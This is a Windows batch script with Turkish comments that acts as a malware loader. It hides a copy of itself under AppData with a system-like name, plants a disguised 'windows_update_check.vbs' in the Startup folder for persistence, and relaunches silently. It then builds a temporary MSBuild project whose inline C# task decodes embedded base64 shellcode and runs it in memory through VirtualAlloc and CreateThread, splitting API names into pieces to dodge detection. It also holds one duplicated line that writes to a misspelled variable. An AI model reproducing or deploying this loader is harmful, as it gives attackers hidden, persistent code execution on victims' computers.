@echo off
setlocal enabledelayedexpansion

:: --- ASAMA 1: GIZLEME VE PERSISTENCE (BASLANGIC) ---
:: Script "run" parametresiyle çağrılmamışsa, gizleme ve kalıcılık aşamasına geç.
if "%~1"=="run" goto :CALISTIR

:: Kalıcı klasör ve dosya isimleri (Değiştirilebilir)
set "P_FOLDER=%APPDATA%\Microsoft\SysUtils"
set "P_BATCH=%P_FOLDER%\win_subsystem_service.bat"
set "P_VBS=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\windows_update_check.vbs"

:: Klasörü oluştur
if not exist "%P_FOLDER%" mkdir "%P_FOLDER%"

:: Kendini kalıcı konuma kopyala
if not exist "%P_BATCH%" (
    copy /y "%~f0" "%P_BATCH%" >nul
)

:: Başlangıç klasörüne VBS bırak (Sessiz çalıştırma için)
if not exist "%P_VBS%" (
    echo Set W = CreateObject^("WScript.Shell"^) > "%P_VBS%"
    :: Kısa dosya yolu (8.3) kullanarak boşluk hatalarını engelle
    for %%I in ("%P_BATCH%") do set "SHORT_PATH=%%~sI"
    echo W.Run "cmd.exe /c !SHORT_PATH! run", 0, False >> "%P_VBS%"
)

:: İlk çalıştırmada Batch'i sessizce tetikle ve ana pencereyi kapat
set "TMP_VBS=%temp%\init_%RANDOM%.vbs"
echo Set W = CreateObject^("WScript.Shell"^) > "%TMP_VBS%"
echo W.Run "cmd.exe /c %~s0 run", 0, False >> "%TMP_VBS%"
wscript.exe "%TMP_VBS%"
del /f /q "%TMP_VBS%"
exit /b

:CALISTIR
:: --- ASAMA 2: DEGISKENLER ---
set "VN=%RANDOM%"
set "VAR_PROJ=%temp%\sys_cache_%VN%.tmp"
set "TASK_NAME=T_%VN%"

:: Eski kalıntıları temizle
if exist "%VAR_PROJ%" del /f /q "%VAR_PROJ%"

:: --- ASAMA 3: CSPROJ YAZMA (MSBUILD INLINE TASK) ---
echo ^<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"^> > "%VAR_PROJ%"
echo   ^<UsingTask TaskName="%TASK_NAME%" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll"^> >> "%VAR_PROJ%"
echo     ^<Task^> >> "%VAR_PROJ%"
echo       ^<Code Type="Class" Language="cs"^> >> "%VAR_PROJ%"
echo         ^<^^![CDATA[ >> "%VAR_PROJ%"
echo             using System; >> "%VAR_PROJ%"
echo             using System.Runtime.InteropServices; >> "%VAR_PROJ%"
echo             using Microsoft.Build.Framework; >> "%VAR_PROJ%"
echo             using Microsoft.Build.Utilities; >> "%VAR_PROJ%"
echo             public class %TASK_NAME% : Task, ITask { >> "%VAR_PROJ%"
echo                 [DllImport("kernel32.dll", EntryPoint="Get"+"Proc"+"Address")] public static extern IntPtr G_P_A(IntPtr h, string n^); >> "%VAR_PROJ%"
echo                 [DllImport("kernel32.dll", EntryPoint="Get"+"Module"+"Handle")] public static extern IntPtr G_M_H(string m^); >> "%VAR_PROJ%"
echo                 [DllImport("kernel32.dll", EntryPoint="Virtual"+"Protect")] public static extern bool V_P(IntPtr a, uint s, uint p, out uint o^); >> "%VAR_PROJ%"
echo                 [DllImport("kernel32.dll", EntryPoint="WaitFor"+"Single"+"Object")] public static extern uint W_F_S_O(IntPtr h, uint ms^); >> "%VAR_PROJ%"
echo                 delegate IntPtr V_A(IntPtr a, uint b, uint c, uint d^); >> "%VAR_PROJ%"
echo                 delegate IntPtr C_T(IntPtr a, uint b, IntPtr c, IntPtr d, uint e, IntPtr f^); >> "%VAR_PROJ%"
echo                 public override bool Execute^(^) { >> "%VAR_PROJ%"
echo                     try { >> "%VAR_PROJ%"
:: --- SHELLCODE BOLUMU ---
echo                         string b64 = "6MCbAADAmwAATkOkOqhL1a6i30QLZlbnx2pwDHj/8ZClstuDpcXA9KMAAAAA3QDiwSIQq+ju4T1FBKqUJIrq0ghalyUp5n4+gLivaobh92LGDtfk8se9rOeOEXiTCGtbf2I+luEx0PiUwo1otoPerwQmS8yj7aoAhdsBHvUEV3CBCBN00KrEkAbBLRMltcSFyPEIQ8DdvgxU2S98zc3AlF3jI4KFbl/+8GCXFdU3RtCDNnrNlcofMmadxJH8C8+k3SCmd+n9yiYQ3Z1QQw7Qu4JMStPS6JIqqE9upb9WNWJovdmbgZSEOv4sqLdrjTofNXJG9IZ4zVtEkNzLO+peB9fxZiQvjIpZAS/B3nISfmO8jhYd/YH5ACFFxq2d1LBBW9dH99b47Ogt3xc5FxA3Fq/6Xvg/1beTY+8/AWQfJXGLzM6b6guF11JWLhIObWGNaj48CHM4rsrDChmueUniQhzjgI2jlsuesC8kEZX5/zA1Bat5WEcZ"; >> "%VAR_PROJ%"
echo                         b64 += "AUIpA1Y/kGuZnkiszHvn1AiWQwnjD+tR1gP0hFauR8y6/Or1Yqx/FqsTdVEgtR2icVvn42xACvCRQXQDsaNZ9FlXxzDfkTaaO1XaI7u2Eb9FtdiiLyRK//Ov6rvySfhXSEOhNnQr/0SRyfE4+97YVl/GREATkhdHgb+mYxerokjg3x8nkIAs+aVJxwgOyh5rDXqdcMTrCincGwrBDsPUExA2ny1jgvzpBJbe/xy9OkhCU/DK/oYAAAAAAAAAAAEAAAADAAAAAAAAAO6ovQ75I23VWNQUfHkQUnYjzgGyuyg/YU7Pu3LEMncKabkQRnXUBjUoNcbmoBiuJtOHKE0ojerpwQFOdF8k+YKAgZPiD5CB09Jcl4ZejgcFwfAhJE8BaglnvYdEf2QBc6T46FzwH3J1K6DN99Fj/9Bp3RaIQx6QjrUjmEavjVtBLxjcEVv2XtqIbhUrBfEYbgYn38wPNeYIXOVVVAfld2U6aQp3WdHgE11Gpsg0"; >> "%VAR_PROJ%"


:: -------------------------
echo                         byte[] sc = Convert.FromBase64String(b64^); >> "%VAR_PROJ%"
echo                         IntPtr k = G_M_H("kernel32.dll"^); >> "%VAR_PROJ%"
echo                         V_A v = ^(V_A^)Marshal.GetDelegateForFunctionPointer^(G_P_A^(k, "Virt"+"ual"+"Al"+"loc"^), typeof^(V_A^)^); >> "%VAR_PROJ%"
echo                         C_T c = ^(C_T^)Marshal.GetDelegateForFunctionPointer^(G_P_A^(k, "Cre"+"ate"+"Th"+"read"^), typeof^(C_T^)^); >> "%VAR_PROJ%"
echo                         IntPtr a = v^(IntPtr.Zero, ^(uint^)sc.Length, 0x3000, 0x40^); >> "%VAR_PROJ%"
echo                         Marshal.Copy^(sc, 0, a, sc.Length^); >> "%VAR_PROJ%"
echo                         uint o; V_P^(a, ^(uint^)sc.Length, 0x20, out o^); >> "%VAR_PROJ%"
echo                         IntPtr h = c^(IntPtr.Zero, 0, a, IntPtr.Zero, 0, IntPtr.Zero^); >> "%VAR_PRO_PROJ%" 2>nul
echo                         IntPtr h = c^(IntPtr.Zero, 0, a, IntPtr.Zero, 0, IntPtr.Zero^); >> "%VAR_PROJ%"
echo                         W_F_S_O^(h, 0xFFFFFFFF^); >> "%VAR_PROJ%"
echo                     } catch { } >> "%VAR_PROJ%"
echo                     return true; >> "%VAR_PROJ%"
echo                 } >> "%VAR_PROJ%"
echo             } >> "%VAR_PROJ%"
echo         ]]^> >> "%VAR_PROJ%"
echo       ^</Code^> >> "%VAR_PROJ%"
echo     ^</Task^> >> "%VAR_PROJ%"
echo   ^</UsingTask^> >> "%VAR_PROJ%"
echo   ^<Target Name="Build"^>^<%TASK_NAME% /^>^</Target^> >> "%VAR_PROJ%"
echo ^</Project^> >> "%VAR_PROJ%"

:: --- ASAMA 4: MSBUILD EXECUTION ---
set "M64=%windir%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe"
set "M32=%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe"

if exist "%M64%" (
    "%M64%" "%VAR_PROJ%" /nologo /verbosity:quiet
) else if exist "%M32%" (
    "%M32%" "%VAR_PROJ%" /nologo /verbosity:quiet
)

:: --- TEMIZLIK ---
timeout /t 2 >nul
if exist "%VAR_PROJ%" del /f /q "%VAR_PROJ%"
exit /b
